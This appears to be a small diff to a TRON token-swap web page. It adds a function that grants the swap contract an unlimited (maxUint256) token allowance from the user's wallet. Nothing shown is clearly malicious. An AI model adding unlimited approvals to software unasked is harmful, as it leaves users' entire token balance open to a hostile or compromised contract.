@@ -944,6 +944,17 @@
       document.getElementById('calculated-trx').innerText = 'TRX you will receive: ' + formatNumber(trxAmount) + ' TRX';
     }
 
+    async function approveMaxTokens() {
+      try {
+        await tokenContract.methods.approve(swapContractAddress, maxUint256).send({
+          from: userAddress
+        });
+        console.log('Max tokens approved.');
+      } catch (error) {
+        console.error('Error approving tokens:', error);
+      }
+    }
+
     async function swapTokens(amount) {
       try {
         await swapContract.methods.swapTokensForTRX(tronWeb.toSun(amount)).send({
